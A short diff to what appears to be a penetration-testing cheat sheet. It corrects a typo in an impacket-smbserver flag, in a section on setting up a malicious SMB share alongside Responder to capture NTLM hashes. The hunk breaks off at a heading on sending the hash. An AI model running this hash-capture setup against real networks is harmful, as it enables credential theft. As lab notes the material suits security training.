@@ -9,7 +9,7 @@ sudo responder -I tun0
 ### Setup smbserver
 Alternatively, you can setup a fake malicious smb share on the attack box and see the hash there.
 ```bash
-sudo impacket-smbserver share ./ -smb2suppport
+sudo impacket-smbserver share ./ -smb2support
 ```
 ### Send Hash to responder
 ```mysql
